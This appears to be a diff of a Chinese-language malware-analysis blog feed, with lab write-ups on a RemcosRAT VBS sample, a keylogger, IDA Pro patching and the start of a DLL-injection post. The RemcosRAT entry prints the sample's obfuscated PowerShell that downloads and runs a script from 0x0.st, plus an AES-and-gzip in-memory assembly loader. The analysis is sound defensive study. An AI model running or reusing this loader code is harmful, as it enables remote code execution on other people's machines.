(($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;aWV4ICgoaXdyIC1Vc2VCYXNpY1BhcnNpbmcgImh0dHBzOi8vMHgwLnN0LzhaZXkucHMxIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">## 解碼過後</span><br><span class="line"></span><br><span class="line">iex (</span><br><span class="line">  (iwr -UseBasicParsing &quot;https://0x0.st/xxxx.ps1&quot;).Content.Replace(&#x27;ABC&#x27;,&#x27;&#x27;)</span><br><span class="line">) -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function decrypt_function($param_var)&#123;$aes_var=[System.Security.Cryptography.Aes]::Create();</span><br><span class="line"></span><br><span class="line">$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;</span><br><span class="line"></span><br><span class="line">$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;</span><br><span class="line"></span><br><span class="line">$aes_var.Key=[System.Convert]::FromBase64String(&#x27;ewMoxjcpzeNBZW19N7eS0/ZStjAsKH1ZQlG6Hp4+rlE=&#x27;);</span><br><span class="line"></span><br><span class="line">$aes_var.IV=[System.Convert]::FromBase64String(&#x27;GwaE+1wDAP4SIjKqb1sLhw==&#x27;);</span><br><span class="line"></span><br><span class="line">$FAPRA=$aes_var.($QfYeqOS[4])();</span><br><span class="line"></span><br><span class="line">$cJMDe=$FAPRA.($QfYeqOS[7])($param_var,0,$param_var.Length);</span><br><span class="line"></span><br><span class="line">$FAPRA.Dispose();</span><br><span class="line"></span><br><span class="line">$aes_var.Dispose();</span><br><span class="line"></span><br><span class="line">$cJMDe;</span><br><span class="line"></span><br><span class="line">&#125;function decompress_function($param_var)&#123;$OMBpZ=New-Object System.IO.MemoryStream(,$param_var);</span><br><span class="line"></span><br><span class="line">$ZMdDq=New-Object System.IO.MemoryStream;</span><br><span class="line"></span><br><span class="line">$ztAGx=New-Object System.IO.Compression.GZipStream($OMBpZ,[IO.Compression.CompressionMode]::($QfYeqOS[2]));</span><br><span class="line"></span><br><span class="line">$ztAGx.($QfYeqOS[5])($ZMdDq);</span><br><span class="line"></span><br><span class="line">$ztAGx.Dispose();</span><br><span class="line"></span><br><span class="line">$OMBpZ.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.ToArray();</span><br><span class="line"></span><br><span class="line">&#125;$YZNls=[System.IO.File]::($QfYeqOS[1])([Console]::Title);</span><br><span class="line"></span><br><span class="line">$eOuee=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::($QfYeqOS[8])($YZNls, 6).Substring(2))));</span><br><span class="line"></span><br><span class="line">[System.Reflection.Assembly]::Load([byte[]]$eOuee).($QfYeqOS[11]).($QfYeqOS[10])($null,$null);</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">kSPdG.writeline &quot;%egViW%s%egViW%e%egViW%t%egViW% &quot;&quot;JMEsIb=$host.UI.RawUI.WindowTitle=&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<!-- <img data-src='hide-malware.png' width='700' align='center' alt='待解析'></img> -->
+
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
+](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
+</ul>
+<br>]]></content>
+      <categories>
+        <category>analysis</category>
+      </categories>
+      <tags>
+        <tag>analysis</tag>
+        <tag>malware</tag>
+        <tag>RemcosRAT</tag>
+        <tag>vbs</tag>
+        <tag>Pending</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【惡意軟體分析】- 04</title>
     <url>/posts/49126/</url>
     <content><![CDATA[<hr>
@@ -923,6 +789,140 @@ vssadmin -->]]></content>
         <tag>analysis</tag>
         <tag>malware</tag>
         <tag>exe</tag>
+        <tag>Pending</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【惡意軟體分析】- 10 - vbs</title>
+    <url>/posts/33372/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
+</blockquote>
+<font size='3'>
+在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+</font>
+
+<br>
+
+<hr>
+<span id="more"></span>
+
+
+<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
+<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
+</li>
+<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
+</li>
+<li><p><a href='https://bazaar.abuse.ch/sample/894037000ac4b08de6e6b0f616ca0b98fc4ab11ce8dced92cee7d52f4f7ce78f//' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
+</li>
+<li><p><font size='3'>HASH256：<code>894037000ac4b08de6e6b0f616ca0b98fc4ab11ce8dced92cee7d52f4f7ce78f</code></font></p>
+</li>
+</ul>
+<hr>
+<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
+<br>
+
+
+<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
+<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
+<li><font size='3'>Virustotal   → 檢查 hash</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
+<li><font size='3'>查看有無參考資訊</font></li>
+</ul>
+<br>
+
+<p><img data-src='pe-studio-1.png' align='center' width='700' alt='PEStudio'></img></p>
+<br>
+
+<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
+<br>
+
+<hr>
+<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
+<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
+<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
+<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
+<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
+</ul>
+</li>
+</ul>
+<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
+<br>
+
+<p><img data-src='procmon-2.png' width='700' align='center' alt='另開 cmd 運行 bat 檔案'></img></p>
+<br>
+
+<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
+<li>檢查有無可疑的路徑、檔案。</li>
+</ul>
+<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
+<br>
+
+<hr>
+<h4 id="1️⃣-notepad"><a href="#1️⃣-notepad" class="headerlink" title="1️⃣ notepad"></a>1️⃣ notepad</h4><ul>
+<li><font size='3'>打開惡意程式查看</font></li>
+</ul>
+<p><img data-src='vbs-text-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
+<br>
+
+<hr>
+<br>
+
+
+<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
+<li><p><font size='3'>執行後會加入 <code>Logon</code> 常駐，並建立 <code>.bat</code> 檔案至 tmp 。 </font></p>
+</li>
+<li><p><font size='3'>移除：</font></p>
+<ul>
+<li><font size='3'><code>C:\Users\ADMINI~1\AppData\Local\Temp\1\Jq1fkvQOn.bat</code></font></li>
+<li><font size='3'><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_79f00caa.cmd</code></font></li>
+</ul>
+</li>
+</ul>
+<br>
+
+
+<hr>
+<br>
+
+<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
+<li><font size='3'><code>Pending</code></font></li>
+</ul>
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
+](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
+</ul>
+<br>]]></content>
+      <categories>
+        <category>analysis</category>
+      </categories>
+      <tags>
+        <tag>analysis</tag>
+        <tag>malware</tag>
+        <tag>vbs</tag>
         <tag>Pending</tag>
       </tags>
   </entry>
@@ -1261,6 +1261,105 @@ vssadmin -->]]></content>
       </tags>
   </entry>
   <entry>
+    <title>【惡意軟體分析】- 08</title>
+    <url>/posts/23304/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
+</blockquote>
+<font size='3'>
+在本練習中，我們將對 smass.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+</font>
+
+<br>
+
+<hr>
+<span id="more"></span>
+
+<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
+<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
+<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
+<li><font size='3'>MD5：<code>07953773c8b4e9f84e87742915dfda47ac7f1553f0ab6f007fc2d4d1971d6f95</code></font></li>
+</ul>
+<hr>
+<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
+<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
+<li><font size='3'>Virustotal   → 查看執行檔</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
+<li><font size='3'>針對檔案資訊進行初步查找</font></li>
+</ul>
+<p><img data-src='pe-studio-1.png' width='700' align='center' alt='確認檔案類型'></img></p>
+<br>
+
+<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
+<br>
+
+<hr>
+<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
+<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
+<li>監控程式的行為</li>
+</ul>
+<p><img data-src='process-monitor-1.png' width='700' align='center' alt='smass.exe'></img></p>
+<br>
+
+<p><img data-src='kbdlog-dat.png' width='700' align='center' alt='kbdlog.dat'></img></p>
+<br>
+
+<hr>
+<br>
+
+<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
+<li><font size='3'>在程式該目錄下建立一個 <code>kbdlog.dat</code> 的檔案，並時刻寫入鍵盤監控。</font></li>
+<li><font size='3'>未發現異常的 <code>NetWork</code> 、 <code>AutoRun</code>。</font></li>
+<li><font size='3'>終止 <code>smass.exe</code> 該進程並移除 <code>kbdlog.dat</code> 。</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
+<li><font size='3'>暫無</font></li>
+</ul>
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> 暫無 </font></li>
+</ul>
+<br>]]></content>
+      <categories>
+        <category>analysis</category>
+      </categories>
+      <tags>
+        <tag>analysis</tag>
+        <tag>malware</tag>
+        <tag>exe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【惡意軟體分析】 - 09 - 勒索</title>
     <url>/posts/39881/</url>
     <content><![CDATA[<hr>
@@ -1382,96 +1481,6 @@ vssadmin -->]]></content>
       </tags>
   </entry>
   <entry>
-    <title>【IDA PRO】程式解構 - Hello World - 01</title>
-    <url>/posts/60293/</url>
-    <content><![CDATA[<hr>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
-<p><font size='3'>這篇文章紀錄 <code>IDA PRO</code> 軟體，分析 <code>Hello World</code> 的過程。</font></p>
-</blockquote>
-<font size='3'>
-在本練習中，我們將對 Hello.exe 檔案進行分析、修改的行為。
-</font>
-
-<hr>
-<span id="more"></span>
-
-
-<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
-<li><font size='3'>Windows 11 ( IDA PRO )</font></li>
-</ul>
-<hr>
-<h5 id="🛠️-Static-Analysis-Tools："><a href="#🛠️-Static-Analysis-Tools：" class="headerlink" title="🛠️ Static Analysis Tools："></a>🛠️ Static Analysis Tools：</h5><ul>
-<li><font size='3'>IDA PRO</font></li>
-<li><font size='3'><code>非必須</code> Docker ( 準備 hello world 代碼 ) </font></li>
-</ul>
-<hr>
-<br>
-
-<h3 id="1-📝-Hello-World-程序"><a href="#1-📝-Hello-World-程序" class="headerlink" title="1. 📝 Hello World !! 程序"></a><font size='5'>1. 📝 Hello World !! 程序</font></h3><ul>
-<li><font size='3'>建立 <code>hello.c</code> 檔案</font></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;Hello, World!!&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><font size='3'>使用 Docker 指令</font></li>
-</ul>
-<p><img data-src='docker-1.png' align='center' alt='docker 編譯'></img></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 Docker 對該資料進行映射，映射後資料夾全部內容都會被拉進容器內</span><br><span class="line">docker run --rm -it -v .:/work -w /work gcc:latest bash</span><br><span class="line"></span><br><span class="line"># 在容器內安裝 MinGW</span><br><span class="line">apt update &amp;&amp; apt install -y mingw-w64</span><br><span class="line"></span><br><span class="line"># 對 hello.c 進行編譯</span><br><span class="line">x86_64-w64-mingw32-gcc hello.c -o hello.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<ul>
-<li><font size='3'>查看執行結果是否正常</font></li>
-</ul>
-<p><img data-src='hello.png' align='center' alt='Hello World'></img></p>
-<br>
-
-<hr>
-<br>
-
-<h3 id="2-📝-IDA-PRO-Analysis"><a href="#2-📝-IDA-PRO-Analysis" class="headerlink" title="2. 📝 IDA PRO Analysis"></a><font size='5'>2. 📝 IDA PRO Analysis</font></h3><ul>
-<li><font size='3'>使用 IDA PRO 打開 exe</font></li>
-</ul>
-<p><img data-src='ida-1.png' width='600' align='center' alt='Open IDA'></img></p>
-<br>
-
-<ul>
-<li><font size='3'>至 Strings 找到 Hello World 字樣 ( <code>Shift + F12</code> ) </font></li>
-</ul>
-<p><img data-src='ida-2.png' width='600' align='center' alt='IDA Strings'></img></p>
-<p><img data-src='ida-3.png' width='600' align='center' alt='Found Hello Word'></img></p>
-<p><img data-src='ida-4.png' width='600' align='center' alt='找到字樣後點選進去，選擇 hex dump'></img></p>
-<p><img data-src='ida-5.png' width='600' align='center' alt='選擇編輯，並將替換的編碼輸入進去'></img></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># IDA PRO Test</span><br><span class="line">49 44 41 20 50 52 4F 20 54 65 73 74 00</span><br></pre></td></tr></table></figure>
-
-<p><img data-src='ida-6.png' width='600' align='center' alt='確認文字變更後，儲存並測試'></img></p>
-<p><img data-src='cmd-1.png' width='600' align='center' alt='🚀 確認無誤 🚀'></img></p>
-<br>
-
-<hr>
-<br>
-
-<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
-<li><font size='3'>透過本次的練習，我們成功利用 IDA Pro 找到並修改可執行檔案 (hello.exe) 內的字串，將 “Hello, World!” 替換為 “IDA PRO Test”。</font></li>
-</ul>
-<br>
-
-<hr>
-<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
-<li><font size='3'> <a href="https://blog.csdn.net/Onlyone_1314/article/details/108697155">IDA修改exe并保存运行</a> </font></li>
-<li><font size='3'> <a href="https://yujiewong.github.io/2017/03/28/%E7%AC%AC2%E7%AB%A0-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90Hello-World-%E7%A8%8B%E5%BA%8F/">逆向分析Hello World! 程序</a> </font></li>
-</ul>
-<br>]]></content>
-      <categories>
-        <category>analysis</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>IDA PRO</tag>
-        <tag>Analysis</tag>
-        <tag>Crack</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【惡意軟體分析】基礎概念篇</title>
     <url>/posts/42213/</url>
     <content><![CDATA[<hr>
@@ -1581,102 +1590,187 @@ dnSpy - 針對.NET的逆向工具，包含靜態跟動態分析功能 -->
       </tags>
   </entry>
   <entry>
-    <title>【惡意軟體分析】- 08</title>
-    <url>/posts/23304/</url>
+    <title>【IDA PRO】程式解構 - Hello World - 01</title>
+    <url>/posts/60293/</url>
     <content><![CDATA[<hr>
 <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
-<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
+<p><font size='3'>這篇文章紀錄 <code>IDA PRO</code> 軟體，分析 <code>Hello World</code> 的過程。</font></p>
 </blockquote>
 <font size='3'>
-在本練習中，我們將對 smass.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+在本練習中，我們將對 Hello.exe 檔案進行分析、修改的行為。
 </font>
-
-<br>
 
 <hr>
 <span id="more"></span>
 
+
 <h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
-<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
-<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
-<li><font size='3'>MD5：<code>07953773c8b4e9f84e87742915dfda47ac7f1553f0ab6f007fc2d4d1971d6f95</code></font></li>
+<li><font size='3'>Windows 11 ( IDA PRO )</font></li>
 </ul>
 <hr>
-<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
-<br>
-
-<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
-<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
-<li><font size='3'>Virustotal   → 查看執行檔</font></li>
+<h5 id="🛠️-Static-Analysis-Tools："><a href="#🛠️-Static-Analysis-Tools：" class="headerlink" title="🛠️ Static Analysis Tools："></a>🛠️ Static Analysis Tools：</h5><ul>
+<li><font size='3'>IDA PRO</font></li>
+<li><font size='3'><code>非必須</code> Docker ( 準備 hello world 代碼 ) </font></li>
 </ul>
-<br>
-
 <hr>
 <br>
 
-<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
-<li><font size='3'>針對檔案資訊進行初步查找</font></li>
+<h3 id="1-📝-Hello-World-程序"><a href="#1-📝-Hello-World-程序" class="headerlink" title="1. 📝 Hello World !! 程序"></a><font size='5'>1. 📝 Hello World !! 程序</font></h3><ul>
+<li><font size='3'>建立 <code>hello.c</code> 檔案</font></li>
 </ul>
-<p><img data-src='pe-studio-1.png' width='700' align='center' alt='確認檔案類型'></img></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;Hello, World!!&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><font size='3'>使用 Docker 指令</font></li>
+</ul>
+<p><img data-src='docker-1.png' align='center' alt='docker 編譯'></img></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 Docker 對該資料進行映射，映射後資料夾全部內容都會被拉進容器內</span><br><span class="line">docker run --rm -it -v .:/work -w /work gcc:latest bash</span><br><span class="line"></span><br><span class="line"># 在容器內安裝 MinGW</span><br><span class="line">apt update &amp;&amp; apt install -y mingw-w64</span><br><span class="line"></span><br><span class="line"># 對 hello.c 進行編譯</span><br><span class="line">x86_64-w64-mingw32-gcc hello.c -o hello.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <br>
 
-<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+<ul>
+<li><font size='3'>查看執行結果是否正常</font></li>
 </ul>
-<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
-<br>
-
-<hr>
-<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
-<br>
-
-<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
-<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
-</ul>
+<p><img data-src='hello.png' align='center' alt='Hello World'></img></p>
 <br>
 
 <hr>
 <br>
 
-<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
-<li>監控程式的行為</li>
+<h3 id="2-📝-IDA-PRO-Analysis"><a href="#2-📝-IDA-PRO-Analysis" class="headerlink" title="2. 📝 IDA PRO Analysis"></a><font size='5'>2. 📝 IDA PRO Analysis</font></h3><ul>
+<li><font size='3'>使用 IDA PRO 打開 exe</font></li>
 </ul>
-<p><img data-src='process-monitor-1.png' width='700' align='center' alt='smass.exe'></img></p>
+<p><img data-src='ida-1.png' width='600' align='center' alt='Open IDA'></img></p>
 <br>
 
-<p><img data-src='kbdlog-dat.png' width='700' align='center' alt='kbdlog.dat'></img></p>
+<ul>
+<li><font size='3'>至 Strings 找到 Hello World 字樣 ( <code>Shift + F12</code> ) </font></li>
+</ul>
+<p><img data-src='ida-2.png' width='600' align='center' alt='IDA Strings'></img></p>
+<p><img data-src='ida-3.png' width='600' align='center' alt='Found Hello Word'></img></p>
+<p><img data-src='ida-4.png' width='600' align='center' alt='找到字樣後點選進去，選擇 hex dump'></img></p>
+<p><img data-src='ida-5.png' width='600' align='center' alt='選擇編輯，並將替換的編碼輸入進去'></img></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># IDA PRO Test</span><br><span class="line">49 44 41 20 50 52 4F 20 54 65 73 74 00</span><br></pre></td></tr></table></figure>
+
+<p><img data-src='ida-6.png' width='600' align='center' alt='確認文字變更後，儲存並測試'></img></p>
+<p><img data-src='cmd-1.png' width='600' align='center' alt='🚀 確認無誤 🚀'></img></p>
 <br>
 
 <hr>
 <br>
 
 <h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
-<li><font size='3'>在程式該目錄下建立一個 <code>kbdlog.dat</code> 的檔案，並時刻寫入鍵盤監控。</font></li>
-<li><font size='3'>未發現異常的 <code>NetWork</code> 、 <code>AutoRun</code>。</font></li>
-<li><font size='3'>終止 <code>smass.exe</code> 該進程並移除 <code>kbdlog.dat</code> 。</font></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
-<li><font size='3'>暫無</font></li>
+<li><font size='3'>透過本次的練習，我們成功利用 IDA Pro 找到並修改可執行檔案 (hello.exe) 內的字串，將 “Hello, World!” 替換為 “IDA PRO Test”。</font></li>
 </ul>
 <br>
 
 <hr>
 <h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
-<li><font size='3'> 暫無 </font></li>
+<li><font size='3'> <a href="https://blog.csdn.net/Onlyone_1314/article/details/108697155">IDA修改exe并保存运行</a> </font></li>
+<li><font size='3'> <a href="https://yujiewong.github.io/2017/03/28/%E7%AC%AC2%E7%AB%A0-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90Hello-World-%E7%A8%8B%E5%BA%8F/">逆向分析Hello World! 程序</a> </font></li>
 </ul>
 <br>]]></content>
       <categories>
         <category>analysis</category>
       </categories>
       <tags>
-        <tag>analysis</tag>
-        <tag>malware</tag>
-        <tag>exe</tag>
+        <tag>Tool</tag>
+        <tag>IDA PRO</tag>
+        <tag>Analysis</tag>
+        <tag>Crack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【DLL Injection】注入攻擊 - 01</title>
+    <url>/posts/33174/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>這篇文章紀錄關於 <code>DLL Injection</code> 的攻擊手法，實際建一個惡意程式來理解過程。</font></p>
+</blockquote>
+<font size='3'>
+在本練習中，我們將針對 Explorer.exe ( 檔案總管 ) ，進行注入並打開 CMD 的簡單行為。
+</font>
+
+<hr>
+<span id="more"></span>
+
+
+<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
+<li><font size='3'>Windows Server 2025</font></li>
+<li><font size='3'> Docker ( Build exe &amp; dll ) ， <code>非必須</code></font></li>
+</ul>
+<hr>
+<br>
+
